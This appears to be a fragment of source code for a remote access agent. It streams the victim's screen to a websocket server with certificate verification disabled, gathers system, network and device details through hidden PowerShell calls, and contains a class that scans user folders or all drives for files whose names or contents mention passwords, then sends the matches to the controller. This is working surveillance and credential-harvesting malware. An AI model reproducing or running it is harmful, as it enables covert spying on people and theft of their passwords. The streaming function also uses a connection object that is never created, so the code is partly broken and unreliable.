    async def start_stream(self, monitor=1):
        if self.streaming:
            self.streaming = False
            await asyncio.sleep(0.2)

        self.streaming = True
        self.current_stream_monitor = monitor

        try:

            protocol = "wss" if self.use_ssl else "ws"

            kwargs = {"max_size": 524288000, "ping_interval": 60, "ping_timeout": 90, "close_timeout": 60}
            if self.use_ssl:

                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE

            await stream_ws.send(json.dumps({
                "type": "stream_start",
                "agent_id": self.agent_id,
                "monitor": monitor
            }))


            with mss.mss() as sct:
                if monitor < len(sct.monitors):
                    mon = sct.monitors[monitor]
                    await self.send_message({
                        "type": "monitor_resolution",
                        "monitor": monitor,
                        "width": mon['width'],
                        "height": mon['height']
                    })

            last_frame_hash = None
            agent_id_bytes = self.agent_id.encode('utf-8')[:36].ljust(36, b'\x00')
            with mss.mss() as sct:
                while self.streaming and self.current_stream_monitor == monitor and self.running:
                    if monitor >= len(sct.monitors):
                        monitor = 1
                        self.current_stream_monitor = 1

                    monitor_data = sct.monitors[monitor]
                    img = sct.grab(monitor_data)
                    pil_img = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                    new_size = (pil_img.width // self.stream_resize_factor,
                                pil_img.height // self.stream_resize_factor)
                    pil_img_resized = pil_img.resize(new_size, Image.Resampling.LANCZOS)
                    buffer = io.BytesIO()
                    pil_img_resized.save(buffer, format="JPEG", quality=self.stream_quality, optimize=True)
                    frame_bytes = buffer.getvalue()

                    import hashlib
                    new_hash = hashlib.md5(frame_bytes).hexdigest()
                    if new_hash != last_frame_hash:
                        last_frame_hash = new_hash
                        header = struct.pack('!4s 36s I I', b'FRAM', agent_id_bytes, monitor, len(frame_bytes))
                        await stream_ws.send(header + frame_bytes)

                    await asyncio.sleep(0.07)

        except Exception as e:
            self.log(f"Stream error: {e}")
        finally:
            self.streaming = False
            if stream_ws:
                await stream_ws.close()

    async def sysinfo(self):
        try:
            data = {}
            

            if sys.platform == 'win32':
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                    
                    product_name = winreg.QueryValueEx(key, "ProductName")[0]
                    current_build = winreg.QueryValueEx(key, "CurrentBuildNumber")[0]
                    

                    try:
                        build = int(current_build)
                        if build >= 22000:  
                            if "Windows 10" in product_name:
                                product_name = product_name.replace("Windows 10", "Windows 11")
                            elif "Windows" in product_name and "11" not in product_name:
                                product_name = product_name.replace("Windows", "Windows 11")
                            else:
                                product_name = f"Windows 11 {product_name.split('Windows')[-1]}".strip()

                    except:
                        pass
                    
                    data['os'] = product_name.strip()
                    data['build'] = current_build
                    

                    try:
                        ubr = winreg.QueryValueEx(key, "UBR")[0]
                        data['full_build'] = f"{current_build}.{ubr}"
                    except:
                        data['full_build'] = current_build
                        
                    winreg.CloseKey(key)
                    
                except Exception as reg_error:
                    data['os'] = f"{platform.system()} {platform.release()}"
                    data['build'] = "Unknown"
                    print(f"Registry read error: {reg_error}")
            else:
                data['os'] = f"{platform.system()} {platform.release()}"
                data['build'] = "N/A"
            

            data['arch'] = platform.machine()
            data['processor'] = platform.processor()
            data['boot_time'] = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            

            data['cpu_cores'] = psutil.cpu_count(logical=True)
            freq = psutil.cpu_freq()
            data['cpu_freq'] = f"{freq.current:.2f} MHz" if freq else "Unknown"
            

            mem = psutil.virtual_memory()
            data['ram_total'] = f"{mem.total / (1024**3):.2f} GB"
            data['ram_used'] = f"{mem.used / (1024**3):.2f} GB ({mem.percent}%)"
            

            disks = []
            for part in psutil.disk_partitions(all=False):
                if os.name == 'nt' and ('cdrom' in part.opts or part.fstype == ''):
                    continue
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    disks.append({
                        'device': part.device,
                        'fstype': part.fstype,
                        'total': f"{usage.total / (1024**3):.2f} GB",
                        'used': f"{usage.used / (1024**3):.2f} GB",
                        'percent': f"{usage.percent}%"
                    })
                except:
                    pass
            data['disks'] = disks


            net_info = []
            try:
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                            net_info.append(f"{interface}: {addr.address}")
            except:
                pass
            data['network'] = net_info


            if sys.platform == 'win32':
                try:
                    gpu_cmd = 'Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name'
                    gpus = subprocess.run(["powershell", "-Command", gpu_cmd], 
                                        capture_output=True, text=True, 
                                        creationflags=0x08000000).stdout.strip().split('\n')
                    data['gpus'] = [g.strip() for g in gpus if g.strip() and g.strip() != ""]


                    dev_cmd = "Get-PnpDevice -Class Media, Image, Camera, AudioEndpoint -Status OK | Select-Object -ExpandProperty FriendlyName"
                    devs = subprocess.run(["powershell", "-Command", dev_cmd], 
                                        capture_output=True, text=True, 
                                        creationflags=0x08000000).stdout.strip().split('\n')
                    data['devices'] = list(set([d.strip() for d in devs if d.strip()]))
                except:
                    data['gpus'] = []
                    data['devices'] = []
            else:
                data['gpus'] = []
                data['devices'] = []


            await self.send_message({"type": "sysinfo_result", "data": data})
            
        except Exception as e:
            print(f"Sysinfo error: {e}")
            fallback = {
                "os": f"{platform.system()} {platform.release()}",
                "arch": platform.machine(),
                "error": str(e)
            }
            await self.send_message({"type": "sysinfo_result", "data": fallback})

class PasswordsInFilesSearcher:
    def __init__(self, ws, agent_id, agent):
        self.ws = ws
        self.agent_id = agent_id
        self.agent = agent
        self.is_searching = False
        self.stop_requested = False
        self.scanned_count = 0
        self.last_status_time = 0
        self.all_keywords = []
        self.search_task = None
        self.speed_limit = 50
        self.search_in_content = True      
        self.search_in_filenames = True    

    def build_keywords(self, custom_word=""):

        keywords = set()
        
        if custom_word and custom_word.strip():
            custom = custom_word.strip()
            keywords.add(custom.lower())
            keywords.add(custom)
            if len(custom) > 3:
                keywords.add(f'"{custom}"')
            return list(keywords)
        
        for kw in PASSWORD_KEYWORDS:
            keywords.add(kw.lower())
            keywords.add(kw)
        
        return list(keywords)

    def filename_matches_keyword(self, filename, keywords):

        filename_lower = filename.lower()
        for keyword in keywords:
            if keyword.lower() in filename_lower:
                return True, keyword
        return False, None

    def is_binary_file(self, file_path, sample_size=1024):
        try:
            with open(file_path, 'rb') as f:
                chunk = f.read(sample_size)
                if b'\x00' in chunk:
                    text_characters = bytearray({7,8,9,10,12,13,27} | set(range(0x20, 0x100)) - {0x7f})
                    return bool(chunk.translate(None, text_characters))
            return False
        except:
            return True

    def get_drives(self, disk_option):
        drives = []
        if disk_option == "user":
            user_dirs = [
                os.path.expanduser("~\\Desktop"),
                os.path.expanduser("~\\Documents"),
                os.path.expanduser("~\\Downloads"),
                os.path.expanduser("~\\Pictures"),
                os.path.expanduser("~\\Videos"),
                os.path.expanduser("~\\Music"),
                os.path.expanduser("~\\OneDrive"),
            ]
            for d in user_dirs:
                if os.path.exists(d):
                    drives.append(d)
        elif disk_option == "C:\\":
            drives = ["C:\\"]
        else:
            import string
            for drive_letter in string.ascii_uppercase:
                drive_path = f"{drive_letter}:\\"
                if os.path.exists(drive_path):
                    drives.append(drive_path)
        return drives

    async def send_status(self, message):
        try:
            await self.agent.send_message({
                "type": "passwords_in_files_status",
                "msg": message,
                "agent_id": self.agent_id
            })
        except:
            pass

    async def send_result(self, matches):
        try:
            await self.agent.send_message({
                "type": "passwords_in_files_result",
                "matches": matches,
                "agent_id": self.agent_id
            })
        except:
            pass

    async def stop(self):
        self.stop_requested = True
        self.is_searching = False
        if self.search_task and not self.search_task.done():
            self.search_task.cancel()
            try:
                await self.search_task
            except asyncio.CancelledError:
                pass
        await self.send_status("⏹ Search stopped by user.")
        self.search_task = None

    async def search_in_file_content(self, file_path, keywords, max_size_mb=10):

        if self.stop_requested or not self.is_searching:
            return []
        
        try:
            size_mb = os.path.getsize(file_path) / (1024 * 1024)
            if size_mb > max_size_mb:
                return []
            
            if self.is_binary_file(file_path):
                return []
            
            encodings = ['utf-8', 'utf-8-sig', 'cp1251', 'cp1252', 'latin-1', 'cp866']
            content = None
            
            for enc in encodings:
                try:
                    with open(file_path, 'r', encoding=enc, errors='replace') as f:
                        content = f.read(1024 * 1024)  
                    break
                except:
                    continue
            
            if not content:
                return []
            
            if self.stop_requested or not self.is_searching:
                return []
            
            content_lower = content.lower()
            
            for keyword in keywords:
                if keyword.lower() in content_lower:

                    lines = content.split('\n')
                    for i, line in enumerate(lines):
                        if keyword.lower() in line.lower():
                            preview = line.strip()[:200]
                            return [{
                                'path': file_path,
                                'match_type': 'content',
                                'keyword': keyword,
                                'line': i + 1,
                                'preview': preview
                            }]
                    

                    return [{
                        'path': file_path,
                        'match_type': 'content',
                        'keyword': keyword,
                        'line': 0,
                        'preview': content[:200].strip()
                    }]
            
            return []
        except Exception:
            return []

    async def scan_directory(self, directory, keywords, max_size_mb, skip_binary):

        results = []
        files_processed_this_second = 0
        last_second_reset = time.time()
        
        try:
            for root, dirs, files in os.walk(directory):
                if self.stop_requested or not self.is_searching:
                    break
                

                skip_dirs = ['$Recycle.Bin', 'System Volume Information', 'Windows\\System32', 
                            'AppData\\Local\\Temp', 'Cache', 'caches', 'tmp', 'temp',
                            'Windows\\WinSxS', 'Windows\\Installer', '$Windows.~BT', '$Windows.~WS']
                should_skip = False
                for skip in skip_dirs:
                    if skip.lower() in root.lower():
                        should_skip = True
                        break
                if should_skip:
                    continue
                
                for file in files:
                    if self.stop_requested or not self.is_searching:
                        break
                    
                    now = time.time()
                    if now - last_second_reset >= 1.0:
                        files_processed_this_second = 0
                        last_second_reset = now
                    elif files_processed_this_second >= self.speed_limit:
                        await asyncio.sleep(0.02)
                        continue
                    
                    file_path = os.path.join(root, file)
                    files_processed_this_second += 1
                    

                    ext = os.path.splitext(file)[1].lower()
                    skip_exts = ['.exe', '.dll', '.sys', '.msi', '.cab', '.zip', '.rar', 
                                '.7z', '.gz', '.iso', '.mp3', '.mp4', '.avi', '.mkv', 
                                '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico']
                    
                    if ext in skip_exts:
                        continue
                    
                    self.scanned_count += 1
                    
                    current_time = time.time()
                    if current_time - self.last_status_time > 0.5:
                        self.last_status_time = current_time
                        await self.send_status(f"Scanning... found {len(results)} matches | scanned: {self.scanned_count}")
                    

                    filename_match_found = False
                    matched_keyword = None
                    
                    if self.search_in_filenames:
                        filename_match_found, matched_keyword = self.filename_matches_keyword(file, keywords)
                        
                        if filename_match_found:
                            results.append({
                                'path': file_path,
                                'match_type': 'filename',
                                'keyword': matched_keyword,
                                'line': 0,
                                'preview': f"[FILENAME MATCH] File name contains '{matched_keyword}'"
                            })
                            await self.send_result([{
                                'path': file_path,
                                'match_type': 'filename',
                                'keyword': matched_keyword,
                                'line': 0,
                                'preview': f"[FILENAME MATCH] File name contains '{matched_keyword}'"
                            }])
                            await asyncio.sleep(0.05)

                    

                    if self.search_in_content:
                        content_matches = await self.search_in_file_content(file_path, keywords, max_size_mb)
                        if content_matches:
                            results.extend(content_matches)
                            await self.send_result(content_matches)
                            await asyncio.sleep(0.05)
                    
                    if self.stop_requested or not self.is_searching:
                        break
        except Exception as e:
            print(f"Scan error: {e}")
        
        return results

    async def start_search(self, disk_option, custom_word, max_size_mb, skip_binary, speed_limit=50):
        self.is_searching = True
        self.stop_requested = False
        self.scanned_count = 0
        self.last_status_time = 0
        self.speed_limit = speed_limit
        self.search_in_content = True
        self.search_in_filenames = True
        
        await self.send_status(f" Starting password file search (speed: {speed_limit} files/sec)...")
        await self.send_status(f" Searching in: file CONTENT + file NAMES")
        
        keywords = self.build_keywords(custom_word)
        await self.send_status(f" Searching for {len(keywords)} keywords (including filename match)")
        
        drives = self.get_drives(disk_option)
        await self.send_status(f" Scanning {len(drives)} location(s)...")
        
        total_matches = 0
        filename_matches = 0
        content_matches = 0
        
        for drive in drives:
            if self.stop_requested or not self.is_searching:
                await self.send_status("⏹ Search stopped by user.")
                self.is_searching = False
                return
            
            await self.send_status(f"📂 Scanning: {drive}")
            matches = await self.scan_directory(drive, keywords, max_size_mb, skip_binary)
            

            for m in matches:
                if m.get('match_type') == 'filename':
                    filename_matches += 1
                else:
                    content_matches += 1
            
            total_matches += len(matches)
        
        if not self.stop_requested and self.is_searching:
            await self.send_status(
                f" Search completed! Found {total_matches} matches total:\n"
                f"    Filename matches: {filename_matches}\n"
                f"    Content matches: {content_matches}\n"
                f"    Scanned {self.scanned_count} files total."
            )
        
        self.is_searching = False
        self.stop_requested = False
